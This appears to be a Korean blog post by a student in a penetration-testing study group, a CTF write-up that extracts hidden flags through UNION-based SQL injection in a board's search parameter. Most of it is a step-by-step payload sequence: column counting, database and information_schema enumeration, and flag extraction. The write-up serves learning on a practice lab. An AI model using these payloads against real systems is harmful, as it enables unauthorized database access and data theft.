---
layout: post
title:  노말틱 모의해킹 스터디 6주차 CTF 문제 (1)
author: leewoojin
date: 2025-05-09 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

해당 문제는 게시판의 `search` 파라미터에서 SQL Injection을 통해 **숨겨진 데이터(flag)** 를 추출하는 문제였습니다.

사전에 [PortSwigger Labs](https://portswigger.net/web-security/sql-injection)에서 SQLi를 학습했기 때문에 쉽게 접근할 수 있을 줄 알았는데, 생각보다 고전했습니다.  

---

## 🧪 시도 과정 및 풀이

### 🎯 시도 1 – SQL Injection이 가능한가?
```
normaltic' OR '1'='1-- 
```

✅ SQL 인젝션 성공 확인

<img src="https://github.com/user-attachments/assets/9a59b257-028f-4390-bbd1-c3f857d3c01a" width="600"/>

### 🎯 시도 2 – 컬럼 수 확인
```
normaltic' ORDER BY 1 --    ✅ 성공  
normaltic' ORDER BY 5 --    ❌ 실패
```
✅ 컬럼 수는 4개로 추정됨

### 🎯 시도 3 – 출력 컬럼 식별
```
normaltic' UNION SELECT 1,2,3,4 -- 
```
✅ 1~4 전부 출력 가능

<img src="https://github.com/user-attachments/assets/2c96a69b-2772-4aa3-b803-fa0839f7e887" width="600"/>

### 🎯 시도 4 – DB 이름 확인
```
normaltic' UNION SELECT database(),2,3,4 -- 
```
✅ DB 이름은 sqli_1

<img src="https://github.com/user-attachments/assets/27d3cde4-c5cf-4863-a971-c8866cc36c1d" width="600"/>

### 🎯 시도 5 – 테이블명 추출
```
normaltic' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='sqli_1' -- 
```
✅ `flag_table`, `plusFlag_Table`, `user_info` 발견

<img src="https://github.com/user-attachments/assets/b584829e-0eae-4d9b-87b2-3c41b63566fa" width="600"/>

### 🎯 시도 6 – 각 테이블의 컬럼명 추출
✅ flag_table
```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='flag_table' -- 
```
<img src="https://github.com/user-attachments/assets/e75dcf42-edc2-4c78-9b7e-909bf3c237bf" width="600"/>

✅ plusFlag_Table
```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='plusFlag_Table' -- 
```
<img src="https://github.com/user-attachments/assets/f7caef9f-82c7-4396-8a7d-8d3eebaa13d0" width="600"/>
✅ user_info

```
normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='user_info' 
--
``` 
<img src="https://github.com/user-attachments/assets/058762f9-5f6d-40a8-9062-e4ce876febed" width="600"/>

### 🎯 시도 7 – 플래그 추출 (flag_table)
```
normaltic' UNION SELECT flag,2,3,4 FROM flag_table -- 
```
✅ flag 컬럼에서 플래그 출력 성공

🎯 시도 8 – 또 다른 flag 컬럼? (plusFlag_Table)
```
normaltic' UNION SELECT idx,flag,3,4 FROM plusFlag_Table -- 
```
✅ 두 번째 플래그 후보도 발견





